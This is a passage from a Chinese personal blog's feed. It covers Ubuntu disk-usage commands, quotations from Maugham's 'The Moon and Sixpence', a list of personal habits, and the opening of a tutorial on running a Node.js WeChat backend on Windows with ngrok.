&lt;p&gt;重启网卡对别的网卡无影响，更推荐一些。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 08 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-08:network.html</guid><category>ubuntu</category></item><item><title>系统数据与清理</title><link>/system-clean.html</link><description>&lt;h3&gt;查找1G以上的文件&lt;/h3&gt;
&lt;p&gt;sudo find / -type f -size +1024000k -exec du -h {} \;&lt;/p&gt;
&lt;h3&gt;查看系统空间&lt;/h3&gt;
&lt;p&gt;df --human-readable&lt;/p&gt;
&lt;h3&gt;文件及文件夹的大小&lt;/h3&gt;
&lt;p&gt;du --human-readable&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 08 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-08:system-clean.html</guid><category>ubuntu</category></item><item><title>月亮和六便士</title><link>/The-Moon-and-Sixpence.html</link><description>&lt;p&gt;我是在阅读《送你一颗子弹》时，得知这本书，在知乎也多次见人推荐。&lt;/p&gt;
&lt;p&gt;最初被刘瑜的这段话吸引：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;全世界都在追逐着梦想，查尔斯却在追逐他的噩运。好吧，这两件事其实没那么不同，被梦想俘虏的人就是在追逐自己的噩运……15年之内，这个伦敦的股票交易员风驰电掣，越过城市，越过文明，越过中产阶级，越过太平洋，越过人性，终于追上了命运这匹烈马……满地都是六便士，他却抬头看见了月亮。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;摘自威廉· 萨默赛特·毛姆《月亮和六便士》&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;**&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;艺术中最令人感兴趣的就是艺术家的个性&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;门外汉要表示对艺术的欣赏,最好的办法就是免开尊口，大大方方地掏出支票簿&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;艺术是什么？艺术是感情的表露，艺术使用的是一种人人都能理解的语言。但是我也承认，艺术评论家如果对技巧没有实际知识，是很少能作出真正有价值的评论的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这可以说是浪漫主义对平凡暗淡的生活的一种抗议&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;那些给他写文章的人必须借助于活跃的想象以弥补贫乏的事实&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他就象宗教法庭的法官审判异教徒那样乐得心花怒放。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;作者为他一本书花费了多少心血，经受多少磨折，尝尽了多少辛酸，只为了给偶然读到这本书的人几小时的休憩，帮助他驱除一下旅途中的疲劳。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;当尼尼微城昌盛一时、名震遐迩的时候，新福音书已经老旧了。说这些豪言壮语的人可能还觉得他们在说一些前人未曾道过的真理，但是实际上连他们说话的腔调前人也已经用过一百次，而且丝毫也没有变化。钟摆摆过来又荡过去，这一旅程永远反复循环。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我想他一定读过那些年轻人写的风靡一时的新诗，而且我还想象他一定认为这些诗不堪卒读&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;柔斯-瓦特尔芙德处世采取的是一种玩世不恭的态度。她把生活看作是给她写小说的一个机会，把世人当作她作品的素材。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;思特里克兰德太太年轻的时候住在寂静的乡间，从穆迪图书馆借来的书籍不只使她阅读到不少浪漫故事，而且也给她的脑子里装上了轮敦这个大城市的罗曼史。她从心眼里喜欢看书&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对于这些人游戏人生的信条她认为无可厚非，但是她自己却一分钟也不想按照他们的方式调整自己的生活。这些人道德轮理上的奇行怪癖，正如他们奇特的衣着、荒唐背理的言论一样，使她觉得非常有趣，但是对她自己立身处世的原则却丝毫也没有影响&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;"为什么讨人喜欢的女人总是嫁给蠢物啊？”  “因为有脑子的男人是不娶讨人喜欢的女人的。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;把短促的生命浪费在无聊的应酬上实在令人莫解。拿这一天的宴会来说，你不能不感到奇怪为什么女主人要请这些客人来，而为什么这些客人也会不嫌麻烦，接受邀请。当天一共有十位宾客。这些人见面时冷冷淡淡，分手时更有一种如释重负的感觉。当然了，这只是完成一次社交义务&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他只不过是一个忠厚老实、索然无味的普通人。一个人可以钦佩他的为人，却不愿意同他待在一起。他是一个毫不引人注意的人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这一定是世间无数对夫妻的故事。这种生活模式给人以安详亲切之感。它使人想到一条平静的小河，蜿蜒流过绿茸茸的牧场，与郁郁的树荫交相掩映，直到最后泻入烟波浩渺的大海中&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我总觉得大多数人这样度过一生好象欠缺一点什么。我承认这种生活的社会价值，我也看到了它的井然有序的幸福，但是我的血液里却有一种强烈的愿望，渴望一种更狂放不羁的旅途。这种安详宁静的快乐好象有一种叫我惊惧不安的东西。我的心渴望一种更加惊险的生活。只要在我的生活中能有变迁——变迁和无法预见的刺激，我是准备踏上怪石嶙峋的山崖，奔赴暗礁满布的海滩的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在我当时年幼无知，睥睨一切的目光中，一个人陷入爱情而又不使自己成为笑柄，三十五岁是最大的年限。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;那时候我还不懂女人的一种无法摆脱的恶习——爇衷于同任何一个愿意倾听的人讨论自己的私事&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我不知道真挚中寒有多少做作，高尚中蕴藏着多少卑鄙&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果想从感情上说动一个人，在午饭以前是很少会成功的。在那些年代里，我自己就常常遐想一些爱情的事，但是只有吃过晚茶后我才能幻想美好婚姻的幸福。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;只有诗人同圣徒才能坚信，在沥青路面上辛勤浇水会培植出百合花来。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但是这里却有一个真正不计较别人如何看待他的人，因而传统礼规对他一点也奈何不得&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;正如同宫廷里的弄臣赞颂皇帝按在他肩头的御杖一样&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;只要他是同一个女人跑掉的，我总认为他还有回来的可能。我不相信这类事能闹出什么名堂来的。不出三个月他对她就会讨厌死了。但是如果他不是因为恋爱跑掉的，一切就都完了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我不敢说。你的意思是：如果他为了一个女人离开你，你是可以宽恕他的；如果他为了一个理想离开你，你就不能了，对不对？你认为你是前者的对手，可是同后者较量起来，就无能为力了，是不是这样？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;女人们总是喜欢在她们所爱的人临终前表现得宽宏大量，她们的这种偏好叫我实在难以忍受。有时候我甚至觉得她们不愿意男人寿命太长，就是怕把演出这幕好戏的机会拖得太晚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们这些人就象从终点站到终点站往返行驶的有轨电车，连乘客的数目也能估计个八九不离十。生活被安排得太有秩序了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一个以手快自豪的扒手对一个把装满贵重首饰的皮包丢在车上的粗心大意的女人一定会感到有些恼火的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她只差一点儿就称得起是个美人，但是正因为差这一点儿，却连漂亮也算不上了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我告诉你他有天才。我有绝对把握。一百年以后，如果还有人记得咱们两个人，那是因为我们沾了认识查理斯-思特里克兰德的光儿&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们还不是笑过马奈？柯罗也是一张画没有卖出去过&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我不想过去。对我说来，最重要的是永恒的现在&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“从你到巴黎以后闹过恋爱吗？”  “我没有时间干这种无聊的事。生命太短促了，没有时间既闹恋爱又搞艺术。“&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;不错。但是当时还有一百个画家，一点也不次于莫奈，同样也卖不掉自己的画。现在这些人的画还是不值钱&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“那么你说说，怎样才知道一个人画得好不好？”戴尔克问道，脸都气红了。 
“只有一个办法——出了名画得就好。” “市侩，”戴尔克喊道。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;当她老了以后，当她失去了圆润的线条和秀丽的形体以后，她在他的眼睛里仍然会是个美人，美貌一点也不减当年。对他说来，她永远是世界上最美丽的女人。他们的井然有序的生活安详娴雅，令人非常愉快。他们住房只有一个画室，一间卧室和一个小厨房。所有家务事都是施特略夫太太自己做；在戴尔克埋头绘画的当儿，她就到市场上去买东西，做午饭，缝衣服，象勤快的蚂蚁一样终日忙碌着。吃过晚饭，她坐在画室里继续做针线活，而戴尔克则演奏一些我猜想她很难听懂的乐曲。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但是这反而使这首乐曲更加现代化，更富于人情味，象是在严肃的场景中插入一个粗俗的打诨，更加激化了美所具备的犀利的性质。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她望着他，欢快中带着某种严肃，这正是她迷人的地方&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“我对你简直失去耐心了。你认为如果你生了病，他会动一根手指头来帮助你吗？” “那又有什么关系？我有你照顾啊。不需要他来帮忙。再说，我同他不一样；我这人一点也不重要。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;天才是世界上最奇妙的东西。对于他们本人说来，天才是一个很大的负担。我们对这些人必须非常容忍，非常耐心才行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果思特里克兰德激发起她的感情来，不是爱就是恨，二者必居其一。当时她对思特里克兰德感到的是恨。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;爱情赋予他明知是虚幻的事物以实质形体，他明知道这一切不过是镜花水月，爱它却远远超过喜爱真实。它使一个人比原来的自我更丰富了一些，同时又使他比原来的自我更狭小了一些。他不再是一个人，他成了追求某一个他不了解的目的的一件事物、一个工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但是爱情这个概念，归根结底，因人而异；每个人都根据自己的不同癖性有不同的理解。因此，象思特里克兰德这样一个人一定也有他自己的独特的恋爱方式。要想分析他的感情实在是一件徒然的事&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;女人对一个仍然爱着她、可是她已经不再爱的男人可以表现得比任何人都残忍&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他心里有罗密欧的热情，却生就一副托比-培尔契爵士的形体。他的禀性仁慈、慷慨，却不断闹出笑话来：他对美的东西从心眼里喜爱，但自己却只能创造出平庸的东西；他的感情非常细腻，但举止却很粗俗&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;大自然在创造这个人的时候，在他身上柔捏了这么多相互矛盾的特点，叫他面对着令他迷惑不解的冷酷人世，这是一个多么残忍的玩笑啊。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;勃朗什-施特略夫显然不过是即将列入巴黎这一年自杀未遂的统计表中的一个数字。医生非常忙，不可能为了我们浪费自己的时间&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在生活中我们一定不要出风头、露头角，惹起命运对我们注目。让我们去寻求那些淳朴、敦厚的人的爱情吧。他们的愚昧远比我们的知识更为可贵&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;”艺术是世界上最伟大的东西。”他沉吟了片刻说&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;好象一个到了异乡的陌生人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;施特略夫企图表达的是一种他过去从来没经历过的感觉，如果用一般的言语，他简直不知道该如何说出口来。他象是一个神秘主义者费力地宣讲一个无法言传的道理&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人们动不动就谈美，实际上对这个词并不理解；这个词已经使用得太滥，失去了原有的力量；因为成千上万的琐屑事物都分享了“美”的称号，这个词已经被剥夺掉它的崇高的寒义了。一件衣服，一只狗，一篇布道词，什么东西人们都用“美”来形容，当他们面对面地遇到真正的美时，反而认不出它来了。他们用以遮饰自己毫无价值的思想的虚假夸大使他们的感受力变得迟钝不堪&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对于任何一个不屑于理他的人他总是非常亲切，这是思特里克兰德的一个特点；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一个恶棍的性格如果刻划得完美而又合乎逻辑，对于创作者是具有一种魅惑的力量的，尽管从法律和秩序的角度看，他决不该对恶棍有任何欣赏的态度&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;作家更关心的是了解人性，而不是判断人性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;男人的灵魂在宇宙的最遥远的地方邀游，女人却想把它禁锢在家庭收支的账簿里&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“你不通人性，”我回答说。“同你谈这些事一点用也没有，就象跟瞎子形容颜色一样。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我觉得这真是非常残忍的；但是最最残忍的还是，这件事对别人并没有什么影响。人们继续生活下去，谁也没有因为这个悲剧而活得更糟&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我有一个奇怪的感觉，这一切只不过是个外壳，我真正看到的是一个脱离了躯体的灵魂&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;每个人都被囚禁在一座铁塔里，只能靠一些符号同别人传达自己的思想；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们非常可怜地想把自己心中的财富传送给别人，但是他们却没有接受这些财富的能力。因此我们只能孤独地行走，尽管身体互相依傍却并不在一起，既不了解别的人也不能为别人所了解。我们好象住在异国的人。对于这个国家的语言懂得非常少，虽然我们有各种美妙的、深奥的事情要说，却只能局限于会话手册上那几句陈腐、平庸的话。我们的脑子里充满了各种思想，而我们能说的只不过是象“园丁的姑母有一把伞在屋子里”这类话。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;只要他觉得能够接近他追寻的事物，采用简单的线条也好，画得歪七扭八也好，他一点儿也不在乎。他根本不考虑真实情况，因为他要在一堆互不相关的偶然的现象下面寻找他自己感到意义重大的事物。他好象已经抓到了宇宙的灵魂，一定要把它表现出来不可。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我觉得你很象一个终生跋涉的香客，不停地寻找一座可能根本不存在的神庙&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;生活是非常单调的；有时为了挣钱糊口，他不得不采取一些权宜的手段，我认为这也并没有什么值得大书特书的地方。即使我能够把他这一段生活记载下来，也不过是他所见到的发生在别人身上的各种事件的记录&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;或许一个人如果想体会到生活中的浪漫情调就必须在某种程度上是一个演员；而要想跳出自身之外，则必须能够对自己的行动抱着一种既超然物外又沉浸于其中的兴趣。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;正象厚玻璃会使人看着手痒痒，想捡起半块砖来似的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一般说来，爱情在男人身上只不过是一个插曲，是日常生活中许多事务中的一件事，但是小说却把爱情夸大了，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;尽管也有很少数男人把爱情当作世界上的头等大事，但这些人常常是一些索然寡味的人；即便对爱情感到无限兴趣的女人，对这类男子也不太看得起。女人会被这样的男人吸引，会被他们奉承得心花怒放，但是心里却免不了有一种不安的感觉——这些人是一种可怜的生物。男人们即使在恋爱的短暂期间，也不停地干一些别的事分散自己的心思：赖以维持生计的事务吸引了他们的注意力；他们沉湎于体育活动；他们还可能对艺术感到兴趣&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在他重新控制住自己以后&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;也许这两个人都在努力用绘画表现出更适合于通过文学表达的意念。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;仿佛是，思特里克兰德的津神一直脱离了他的躯体到处漫游，到处寻找寄宿，最后，在这个遥远的土地上，终于进入了一个躯壳。用一句陈腐的话说，他在这里可谓“得其所哉”。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他连忙转身走开，好象突然记起自己还有个约会似的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;终于向点燃起自己丰富想象的陌生的荒岛出发了。我喜欢这样一个画面：他活到四十七岁（到了这个年纪大多数人早已掉进舒适的生活沟槽里了）动身到天涯海角去寻找一个新世界&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;机缘把他们随便抛掷到一个环境中，而他们却一直思念着一处他们自己也不知道坐落在何处的家乡。在出生的地方他们好象是过客；从孩提时代就非常熟悉的浓荫郁郁的小巷，同小伙伴游戏其中的人烟稠密的街衢，对他们说来都不过是旅途中的一个宿站&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这种人在自己亲友中可能终生落落寡台，在他们唯一熟悉的环境里也始终孑身独处。也许正是在本乡本土的这种陌生感才逼着他们远游异乡，寻找一处永恒定居的寓所&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他的心好象被什么东西揪了一下。突然间，他感到一阵狂喜，有一种取得无限自由的感觉&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;从来没有。一分钟也没有后悔过。我挣的钱刚够维持生活，但是我感到心满意足。我什么要求也没有，只希望这样活下去，直到我死。我生活得非常好&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我很怀疑，阿伯拉罕是否真的糟蹋了自己。做自己最想做的事，生活在自己喜爱的环境里，淡泊宁静、与世无争，这难道是糟蹋自己吗？与此相反，做一个著名的外科医生，年薪一万镑，娶一位美丽的妻子，就是成功吗？我想，这一切都取决于一个人如何看待生活的意义，取决于他认为对社会应尽什么义务，对自己有什么要求。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;思特里克兰德画画儿、看书，天黑了以后，就同爱塔一起坐在凉台上，一边怞烟一边望着天空&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这里的夜这么美，你的灵魂好象都无法忍受肉体的桎梏了。你感觉到你的灵魂随时都可能飘升到缥缈的空际，死神的面貌就象你亲爱的朋友那样熟悉&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;‘她不打扰我，’他说。‘她给我做饭，照管孩子。我叫她做什么她就做什么。凡是我要求一个女人的，她都给我了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一般人都不是他们想要做的那种人，而是他们不得不做的那种人。在英国或法国，思特里克兰德可以说是个不合时宜的人，“圆孔里插了个方塞子”，而在这里却有各种形式的孔，什么样子的塞子都能各得其所。我并不认为他到这里以后脾气比过去变好了，不那么自私了，或者更富于人情味儿了；而是这里的环境对他比以前适合了。假如他过去就在这里生活，人们就不会注意到他的那些劣点了。他在这里所经历到的是他在本乡本土不敢希冀、从未要求的——他在这里得到的是同情。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;世界上只有少数人能够最终达到自己的理想。我们的生活很单纯、很简朴。我们并不野心勃勃，如果说我们也有骄傲的话，那是因为在想到通过双手获得的劳动成果时的骄傲。我们对别人既不嫉妒，更不怀恨&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对上帝的信仰&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;别这么说，我亲爱的先生，人们都是这样的。恐惧使人们变得残酷无情&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;蒂阿瑞把我搂在她肥大的胸脯里（我有一种掉在波涛汹涌的大海中的感觉）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我很怀疑，她知道不知道她把屋子装点得五颜六色的这种风尚都是因为南海岛屿上一个可怜的画家有过这种幻梦。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;思特里克兰德的孩子同另一个小伙子跳起舞来，在暗哑的手风琴声中，他们疯狂地跳着。头顶上是一片碧空，群星熠熠，太平洋烟波淼茫，浩瀚无垠。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 06 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-06:The-Moon-and-Sixpence.html</guid><category>读书</category></item><item><title>记录有趣的想法</title><link>/thought.html</link><description>&lt;p&gt;所闻/所见/所思&lt;/p&gt;
&lt;p&gt;陆续更新&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每天整理学习心得，傍晚散步，此处走走，坚持锻炼&lt;/li&gt;
&lt;li&gt;每周逛一个地方，写一篇文章，认真去知乎回答一个问题，给家里打个电话。&lt;/li&gt;
&lt;li&gt;每个月看一本闲书，一部电影，为了好玩，学习一项无用的技能。&lt;/li&gt;
&lt;li&gt;你的所有技巧都有可能过时，都有可能被超越，你熟悉的编程语言/框架有一天会被淘汰，你的核心竞争力应当是你的思维方式。编程的本质是思考/解决问题，所有提高你思维能力的东西最终都会促进你解决问题的能力，最终帮助你写出良好的代码。&lt;br /&gt;
而提高你的思考能力的方法有那么多。抽出时间，丢下手头的工作，多去经历，多思考，多阅读，学习新的东西，结交有趣的朋友。出游，交谈，闲书，让自己保持丰富和好奇&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 06 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-06:thought.html</guid><category>日记</category></item><item><title>在微软下搭建nodejs微信后端</title><link>/use-nodejs-in-windows.html</link><description>&lt;p&gt;教一个学妹在windows下用nodejs部署微信后台。顺便发到博客上。&lt;/p&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;在此只说如何部署后台，至于注册使用微信公众号相关事宜，自行google之。&lt;br /&gt;
以下内容，默认你已经注册好了微信公众号。  &lt;/p&gt;
&lt;p&gt;此外所有需要的工具，我都打包在&lt;a href="http://pan.baidu.com/s/1nthtCfR"&gt;这里&lt;/a&gt;了,点击下载就行.之后解压它。&lt;/p&gt;
&lt;h2&gt;ngrok&lt;/h2&gt;
&lt;p&gt;在cmd中,进入ngrok所在目录，,执行&lt;code&gt;ngrok.exe 80&lt;/code&gt;，终端将返回一个url.不要关闭这个窗口,最后一步将用到.&lt;/p&gt;
&lt;p&gt;就是这货：&lt;/p&gt;
